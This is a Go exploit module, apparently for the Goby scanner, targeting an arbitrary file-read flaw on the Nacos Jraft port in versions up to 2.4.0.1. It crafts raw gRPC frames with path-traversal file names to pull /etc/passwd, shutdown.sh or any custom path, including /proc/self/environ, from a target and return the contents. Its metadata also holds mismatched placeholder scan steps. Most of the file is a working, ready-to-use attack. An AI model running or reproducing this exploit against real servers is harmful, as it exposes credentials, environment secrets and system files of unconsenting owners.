package exploits

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Nacos  Jraft Services File Read Vulnerability",
    "Description": "<p>NACOS is a new open source project launched by Alibaba , is an easier to build cloud-native applications dynamic service discovery , configuration management and service management platform. Dedicated to help discover , configure and manage microservices . Nacos provides a set of easy to use feature set , you can quickly realize dynamic service discovery , service configuration , service metadata and traffic management .</p><p>An arbitrary file read vulnerability exists on the NACOS Jraft port (default value 7848) in Nacos &lt;= 2.4.0.1 under cluster mode startup.</p>",
    "Product": "NACOS",
    "Homepage": "https://nacos.io/zh-cn/index.html",
    "DisclosureDate": "2024-08-28",
    "PostTime": "2024-08-30",
    "Author": "Town",
    "FofaQuery": "banner=\"x00\"&& banner=\"x12\" && banner=\"x04\" && banner=\"x7f\" && banner=\"xff\" && banner=\"request\"",
    "GobyQuery": "banner=\"x00\"&& banner=\"x12\" && banner=\"x04\" && banner=\"x7f\" && banner=\"xff\" && banner=\"request\"",
    "Level": "1",
    "Impact": "<p>An attacker can read arbitrary system files by sending a specific request packet.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://nacos.io/blog/announcement-nacos-security-problem-file/\">https://nacos.io/blog/announcement-nacos-security-problem-file/</a></p>",
    "References": [
        "https://forum.butian.net/article/570"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../../../../../../proc/self/environ",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "Nacos Jraft 服务文件读取漏洞",
            "Product": "NACOS",
            "Description": "<p>NACOS 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。&nbsp;</p><p>在Nacos&lt;=2.4.0.1版本中集群模式启动下的NACOS Jraft端口（默认值7848）存在任意文件读取的漏洞。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://nacos.io/blog/announcement-nacos-security-problem-file/\">https://nacos.io/blog/announcement-nacos-security-problem-file/</a><br></p>",
            "Impact": "<p>攻击者通过发送特定的请求包，可以读取任意系统文件。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Nacos  Jraft Services File Read Vulnerability",
            "Product": "NACOS",
            "Description": "<p>NACOS is a new open source project launched by Alibaba , is an easier to build cloud-native applications dynamic service discovery , configuration management and service management platform. Dedicated to help discover , configure and manage microservices . Nacos provides a set of easy to use feature set , you can quickly realize dynamic service discovery , service configuration , service metadata and traffic management .</p><p>An arbitrary file read vulnerability exists on the NACOS Jraft port (default value 7848) in Nacos &lt;= 2.4.0.1 under cluster mode startup.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://nacos.io/blog/announcement-nacos-security-problem-file/\">https://nacos.io/blog/announcement-nacos-security-problem-file/</a><br></p>",
            "Impact": "<p>An attacker can read arbitrary system files by sending a specific request packet.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9948"
}`
	postDat_dcjsuafyayuhsdfuijasfhyiashbfh := func(hexData string, conn net.Conn) (string, error) {
		data, err := hex.DecodeString(hexData)
		if err != nil {
			return "", err
		}
		_, err = conn.Write(data)
		if err != nil {
			return "", err
		}
		// 接收返回
		buf := make([]byte, 4096)
		n, err := conn.Read(buf)
		if err != nil {
			return "", err
		}
		return hex.EncodeToString(buf[:n]), nil
	}
	postOrGet_cvhjsdhujyfghvsdyhjvfcdbnsutycvdtgs := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		serverAddr := hostInfo.HostInfo
		filename := fileUrl
		// 建立 TCP 连接
		conn, err := httpclient.GetTCPConn(serverAddr)
		if err != nil {
			return "", err
		}

		defer conn.Close()
    	// 设置读写超时时间为10秒
	  	conn.SetDeadline(time.Now().Add(10 * time.Second))

		// 16 进制数据
		hexData := ""
		data := ""
		hexData = "505249202a20485454502f322e300d0a0d0a534d0d0a0d0a000018040000000000000200000000000300000000000400100000000600002000000004080000000000000f0001"
		data, err = postDat_dcjsuafyayuhsdfuijasfhyiashbfh(hexData, conn)
		if err != nil {
			return "", err
		}

		hexData = "0000b9012400000003000000000f410e3132372e302e302e313a3738343844372f636f6d2e616c69626162612e6e61636f732e636f6e73697374656e63792e656e746974792e52656164526571756573742f5f63616c6c83865f106170706c69636174696f6e2f677270634002746508747261696c6572737a16677270632d6a6176612d6e657474792f312e35372e324014677270632d6163636570742d656e636f64696e6704677a6970400c677270632d74696d656f757408343535323133367500002e00010000000300000000290a196e616d696e675f70657273697374656e745f73657276696365120c5b224d5335306548513d225d"
		// 1.文件名替换
		base64Encoded := base64.StdEncoding.EncodeToString([]byte(filename))
		base64Bytes := []byte(base64Encoded)
		hexEncoded := hex.EncodeToString(base64Bytes)
		hexData = strings.Replace(hexData, "4d5335306548513d", hexEncoded, 1)
		//2.长度替换1
		searchString := "00000029"
		index := strings.Index(hexData, searchString)
		if index == -1 {
			err := fmt.Errorf("String '00000029' not found")
			return "", err
		}
		afterSubstring := hexData[index+len(searchString):]
		length := len(afterSubstring)
		byteCount := length / 2
		hexString := strconv.FormatInt(int64(byteCount), 16)
		if len(hexString)%2 != 0 {
			hexString = "0" + hexString
		}
		hexData = strings.Replace(hexData, "00000029", "000000"+hexString, 1)
		//3.长度替换2
		hexString = strconv.FormatInt(int64(byteCount)+5, 16)
		if len(hexString)%2 != 0 {
			hexString = "0" + hexString
		}
		//4.长度替换3
		hexData = strings.Replace(hexData, "00002e", "0000"+hexString, 1)
		//5.长度替换4
		hexString = strconv.FormatInt(int64(len(serverAddr))+171, 16)
		if len(hexString)%2 != 0 {
			hexString = "0" + hexString
		}
		//6.长度替换5
		hexData = strings.Replace(hexData, "0000b9", "0000"+hexString, 1)

		hexString = strconv.FormatInt(int64(len(serverAddr)), 16)
		if len(hexString)%2 != 0 {
			hexString = "0" + hexString
		}
		//7.url替换
		hexData = strings.Replace(hexData, "0f410e", "0f41"+hexString, 1)
		//查找 "00000029" 的位置
		searchString = "65120c"
		index = strings.Index(hexData, searchString)
		if index == -1 {
			err = fmt.Errorf("String '65120c' not found")
			return "", err
		}
		// 提取 "00000029" 后面的部分，计算字节数然后替换
		afterSubstring = hexData[index+len(searchString):]
		length = len(afterSubstring)
		byteCount = length / 2
		hexString = strconv.FormatInt(int64(byteCount), 16)
		if len(hexString)%2 != 0 {
			hexString = "0" + hexString
		}
		//8.长度替换6
		hexData = strings.Replace(hexData, "65120c", "6512"+hexString, 1)

		byteSlice := []byte(serverAddr)
		//9.长度替换8
		hexString = hex.EncodeToString(byteSlice)
		hexData = strings.Replace(hexData, "3132372e302e302e313a37383438", hexString, 1)

		data, err = postDat_dcjsuafyayuhsdfuijasfhyiashbfh(hexData, conn)
		if err != nil {
			return "", err
		}

		dedata, err := hex.DecodeString(data)
		if err != nil {
			return "", err
		}
		_, err = conn.Write(dedata)
		if err != nil {
			return "", err
		}
		endFlagHex := "677270632d7374617475730130"
		endFlag, err := hex.DecodeString(endFlagHex)
		if err != nil {
			return "", err
		}

		// 创建缓冲区和数据容器
		buf := make([]byte, 4096)
		var tmpdata []byte

		for {
			// 读取数据到缓冲区
			n, err := conn.Read(buf)
			if err != nil {
				return "", err
			}

			// 将读取的数据追加到 data 中
			tmpdata = append(tmpdata, buf[:n]...)

			// 检查数据中是否包含结束标志
			if bytes.Contains(tmpdata, endFlag) {
				break
			}
		}
		decodedString := string(tmpdata)
		// 正则表达式提取 "values" 数组中的 Base64 字符串
		re := regexp.MustCompile(`"values":\["(.*?)"\]`)
		matches := re.FindStringSubmatch(decodedString)
		if len(matches) < 2 {
			return "", fmt.Errorf("read file failed,please check if the file exists")
		}
		// 提取出的 Base64 字符串
		base64String := matches[1]
		// Base64 解码
		decodedBytes, err := base64.StdEncoding.DecodeString(base64String)
		if err != nil {
			return "Failed to decode Base64 string: " + base64String, nil
		}
		respTxt = string(decodedBytes)
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//非HTTP数据包没有路径
			vulURL := "Jraft://"+ u.HostInfo
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../../../../../../etc/passwd": "root:",
				//windows下无法跨盘符读取所以增加如下
				"../../../bin/shutdown.sh": "#!/bin/bash",
			}
			// 函数继承
			uploadFileFunc := postOrGet_cvhjsdhujyfghvsdyhjvfcdbnsutycvdtgs

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"../../../../../../../../etc/passwd", "root:"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_cvhjsdhujyfghvsdyhjvfcdbnsutycvdtgs

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
